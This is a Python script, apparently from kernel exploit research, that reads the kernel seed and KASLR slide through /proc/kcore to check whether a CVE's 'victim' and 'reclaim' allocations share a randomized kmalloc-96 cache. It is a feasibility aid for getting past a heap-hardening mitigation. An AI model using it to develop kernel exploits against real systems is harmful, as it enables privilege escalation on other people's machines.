#!/usr/bin/env python3
"""cache_match.py - run on the guest as root.

Computes the RANDOM_KMALLOC_CACHES bucket for the two CVE-relevant kmalloc-96
call sites from the per-boot random_kmalloc_seed:

  victim    : tcp_v4_route_req+0x91      (tcp_v4_save_options)
  reclaim   : tcp_reqsk_record_syn+0x77  (saved_syn)

Prints "MATCH idx=N" when they share a kmalloc-rnd-XX-96 cache.
"""
import struct
import sys


def kcore_read(va, n):
    f = open("/proc/kcore", "rb")
    hdr = f.read(64)
    assert hdr[:4] == b"\x7fELF" and hdr[4] == 2
    e_phoff = struct.unpack_from("<Q", hdr, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", hdr, 0x36)[0]
    e_phnum = struct.unpack_from("<H", hdr, 0x38)[0]
    f.seek(e_phoff)
    for _ in range(e_phnum):
        ph = f.read(e_phentsize)
        p_type = struct.unpack_from("<I", ph, 0)[0]
        p_offset, p_vaddr, p_paddr, p_filesz = struct.unpack_from("<QQQQ", ph, 8)
        if p_type == 1 and p_vaddr <= va < p_vaddr + p_filesz:
            f.seek(p_offset + (va - p_vaddr))
            return f.read(n)
    raise SystemExit("VA not mapped")


def main():
    syms = {}
    for line in open("/proc/kallsyms"):
        p = line.split()
        if len(p) >= 3:
            try:
                syms[p[2]] = int(p[0], 16)
            except ValueError:
                pass
    seed = int.from_bytes(kcore_read(syms["random_kmalloc_seed"], 8), "little")
    slide = syms["_text"] - 0xFFFFFFFF81000000
    ret_save = 0xFFFFFFFF82019081 + slide
    ret_saved = 0xFFFFFFFF82000FA7 + slide
    G = 0x9E3779B97F4A7C15
    M = (1 << 64) - 1

    def idx(c):
        return (((c ^ seed) & M) * G & M) >> 60

    a, b = idx(ret_save), idx(ret_saved)
    print(f"seed=0x{seed:016x} slide=0x{slide:x} victim_idx={a} saved_idx={b} "
          f"{'MATCH' if a == b else 'NOMATCH'}")


if __name__ == "__main__":
    main()
